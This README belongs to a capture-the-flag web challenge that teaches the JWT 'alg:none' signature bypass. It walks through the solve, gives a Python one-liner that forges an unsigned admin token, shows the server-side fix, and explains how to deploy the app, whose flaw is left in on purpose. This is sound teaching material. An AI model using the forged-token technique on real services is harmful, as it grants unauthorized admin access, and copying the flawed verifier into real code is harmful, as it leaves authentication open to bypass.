# Vault — JWT alg:none challenge

Rung 2 of the web-exploitation ladder. A document store that verifies sessions
with a JWT — but trusts the algorithm the *token* names, so a forged
`"alg":"none"` token with `role:admin` sails through.

- **Category:** Web
- **Difficulty:** easy–medium
- **Vuln class:** JWT algorithm confusion (`alg:none` signature bypass)
- **Contrast with rung 1 (Lockbox):** there the authorization check was
  *missing* (IDOR). Here the role check in `api/doc.js` is **correct** — you're
  properly blocked from the admin doc. The flaw is one layer down: the token
  verifier (`api/_jwt.js`) accepts `alg:none` and skips signature checking, so
  you forge a token claiming `role:admin`. Authentication vs authorization,
  seen from the other side.

## Intended solve

1. Log in as `alice / password123`. The app shows your JWT — three base64url
   parts: `header.payload.signature`.
2. Decode the payload (`base64url`): `{"user":"alice","role":"user"}`. Try to
   open document id 3 → `403 admins only`.
3. Forge a new token: header `{"alg":"none","typ":"JWT"}`, payload
   `{"user":"alice","role":"admin"}`, empty signature — i.e.
   `base64url(header) + "." + base64url(payload) + "."`.
4. Send it as `Authorization: Bearer <forged>` and open document 3. The flag is
   the admin doc's body.

```bash
# forge it in one line
python3 -c "import base64,json
b=lambda o:base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'})+'.'+b({'user':'x','role':'admin'})+'.')"
```

**The fix** (commented in `api/_jwt.js`): pin the algorithm on the server
(`const expected = 'HS256'`) and reject anything else — including `none` —
*before* looking at the signature. Never take the algorithm from the token.

## Files

```
public/index.html   login → shows your JWT → list/open documents
api/_jwt.js         hand-rolled JWT (sign + verify); the alg:none flaw is here
api/_data.js        users + docs; flag from env (JWT_FLAG), never committed
api/login.js        POST /api/login -> signed HS256 token
api/docs.js         GET  /api/docs   (titles for your role)
api/doc.js          GET  /api/doc?id= (admin docs need role admin — checked)
serve.js            zero-dep local runner
vercel.json         static + serverless
```

## Download and run locally

```bash
cd challenge-instances/jwt-vault
JWT_FLAG='flag{anything}' node serve.js      # -> http://localhost:3000
```

`serve.js` re-requires handlers per request, so edit `api/_jwt.js` (make it
reject `alg:none`) and watch the forged token stop working immediately.

## Deploy (its own Vercel project)

Vercel dashboard → New Project → import the repo → Root Directory
`challenge-instances/jwt-vault` → add env var `JWT_FLAG`. Or CLI:

```bash
cd challenge-instances/jwt-vault
vercel && vercel env add JWT_FLAG production && vercel --prod
```

Turn **Deployment Protection off** for the project or the URL will redirect to a
Vercel login.

## Flag & repo note

`JWT_FLAG` lives only in the Vercel env var; source has a placeholder. As with
Lockbox, the annotated source here explains the bug on purpose — it spoils the
solve, which is fine for a public learning workbench.
